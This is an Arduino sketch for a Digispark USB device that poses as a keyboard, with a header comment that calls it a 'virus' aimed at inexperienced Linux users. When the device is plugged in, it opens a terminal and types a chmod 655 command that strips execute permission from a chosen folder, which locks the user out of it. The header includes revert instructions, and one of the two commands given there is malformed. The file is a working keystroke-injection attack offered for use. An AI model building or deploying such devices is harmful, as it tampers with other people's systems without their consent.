/*
                                                                      Info about the script:
                                                                      ----------------------

Script category:
----------------
This script fall in the category of virus.


What does this codes does?:  
----------------------------
This code change the mod of a folder to 655 "rw-r-r".


How Dangerous is it?:
---------------------
It may look like something stupid, but this code is effective virus that can make you loose your mind.

By changing folder mod from tipital 755 to 655, the following will happen:
  * You won't be able to access your folders from terminal, even if you are the root user.
  * You can only enter in the directory from GUI, but any file in there won't be accesible in any way, making it corrupted.
  

How many times does it takes to entirely execute the code?:
-----------------------------------------------------------
It takes from 7 to 12 seconds to launch the code. If needed you can add more time before compiling.


Against who is it effective?:
-----------------------------
OS -> It is effective against GNU/Linux OS with a DE thats accepts the keyboard shortcut CTRL + ALT + T (Typicaly GNOME DE).
Human -> It is effective against any inexperienced linux users that don't know the fundamental of linux


How to revert changes:
----------------------
To revert changes, you simply need to add an execution mod to the folder. This can be done by doing 2 commands:

$ chmod 755 folder-name
            or
$ chmod x+u folder-name
*/


#include <DigiKeyboard.h>

void setup() {

DigiKeyboard.delay(5000);                                                             // Waits for 5 seconds
DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);                   // Open terminal with shortcut CTRL + ALT + T
DigiKeyboard.delay(5000);                                                             // Waits for 5 seconds
DigiKeyboard.print("chmod 655 FILOFILO-HERE");                                        // Change the mode of the choosen directory
DigiKeyboard.delay(2000);                                                             // Waits for 2 seconds
DigiKeyboard.sendKeyStroke(KEY_ENTER);                                                // Press Enter/Return Key

}

// Solfus repositories
